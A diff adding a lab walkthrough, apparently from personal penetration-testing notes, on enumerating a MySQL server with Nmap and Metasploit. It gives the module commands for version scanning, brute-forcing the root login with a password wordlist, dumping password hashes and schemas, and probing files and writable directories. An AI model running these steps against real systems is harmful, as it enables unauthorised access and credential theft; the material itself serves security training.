@@ -816,6 +816,192 @@ run
 Conclusion
 we learned about Apache enumeration using the Metasploit framework modules.
 
+
+
+
+
+
+
+# MySQL Enumeration
+MySQL is an open-source relational database management system (RDBMS). It is one of the most widely used database systems in the world and is commonly used in web applications and is a central component of the LAMP stack (Linux, Apache, MySQL, PHP/Python/Perl). The default port for MySQL server is 3306. This port is used for client-server communication in MySQL database management systems.
+
+we will take a look at different auxiliary modules in Metasploit related to MySQL that we can run against the target to gather sensitive information.
+
+
+Objective: Your task is to run the following auxiliary modules against the target:
+
+auxiliary/scanner/mysql/mysql_version
+auxiliary/scanner/mysql/mysql_login
+auxiliary/admin/mysql/mysql_enum
+auxiliary/admin/mysql/mysql_sql
+auxiliary/scanner/mysql/mysql_file_enum
+auxiliary/scanner/mysql/mysql_hashdump
+auxiliary/scanner/mysql/mysql_schemadump
+auxiliary/scanner/mysql/mysql_writable_dirs
+
+
+Tools
+The best tools for this are:
+
+Nmap
+Metasploit Framework
+
+
+In the beginning we have to ping the target
+
+```bash
+┌──(root)-[~]
+└─# ping -c 5 example.com
+PING example.com (IP) 56(84) bytes of data.
+64 bytes from example.com (IP): icmp_seq=1 ttl=64 time=0.041 ms
+64 bytes from example.com (IP): icmp_seq=2 ttl=64 time=0.040 ms
+64 bytes from example.com (IP): icmp_seq=3 ttl=64 time=0.038 ms
+64 bytes from example.com (IP): icmp_seq=4 ttl=64 time=0.038 ms
+64 bytes from example.com (IP): icmp_seq=5 ttl=64 time=0.040 ms
+
+--- demo.ine.local ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4136ms
+rtt min/avg/max/mdev = 0.038/0.039/0.041/0.001 ms
+```
+
+Then we have to run nmap aginst the target.
+```bash
+nmap IP
+```
+
+After that we have to use Metasploit-freamework.
+
+But before we work with the metasploit we have to start the postgresql.
+
+```bash
+service postgresql start
+```
+Then we have to start the Metasploit.
+```bash
+msfconsole
+```
+
+once the metasploit lunched, we have to create workspace by using this command.
+
+```bash
+msf6 > workspace -a Mysql_workspace
+[*] Added workspace: Mysql_workspace
+[*] Workspace: Mysql_workspace
+```
+
+After that if you have one target you have you set global target for all, by doing this.
+
+```bash
+msf > setg RHOST example.com
+msf > setg RHOSTS example.com
+```
+Then you have to use the version module aginst the target
+```bash
+msf > use auxiliary/scanner/mysql/mysql_version
+msf6 auxiliary(scanner/mysql/mysql_version) > 
+```
+```bash
+msf6 auxiliary(scanner/mysql/mysql_version) > run
+
+[+] IP:3306 - IP:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
+[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+We know now the version of the  MySQL are ==> MySQL 5.5.61-0ubuntu0.14.04.1 
+
+
+Now we will use the login module.
+
+```bash
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS example.com
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+```
+After that you see if you have a credintial for it or not.
+
+
+Now we will use the mysql_enum module.
+
+```bash
+use auxiliary/admin/mysql/mysql_enum
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set RHOSTS IP
+run
+```
+
+Now we will use the mysql_sql module.
+
+```bash
+use auxiliary/admin/mysql/mysql_sql
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set RHOSTS IP
+run
+```
+Now we will use the mysql_file_enum.
+
+```bash
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set RHOSTS IP
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+```
+
+
+Now we will use the mysql_hashdump.
+
+```bash
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set RHOSTS IP
+run
+```
+Now we will use the mysql_schemadump.
+
+```bash
+use auxiliary/scanner/mysql/mysql_schemadump
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set RHOSTS IP
+run
+```
+Now we will use the mysql_writable_dirs.
+
+```bash
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS IP
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+
+```bash
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS IP
+set USERNAME root
+set PASSWORD [The password you find it in the login module]
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+
+Conclusion
+we explored different MySQL related metasploit modules that we can run against the target and gather sensitive information.
+
+
+
+
+
 # Lab Description:
 This lab focuses on enumeration techniques to identify and analyze running services on a target Linux machine. The goal is to explore and interact with the machine's services to uncover and capture hidden flags. Participants will apply their knowledge of network and system enumeration to identify misconfigurations, weak credentials, and potential security vulnerabilities.
 
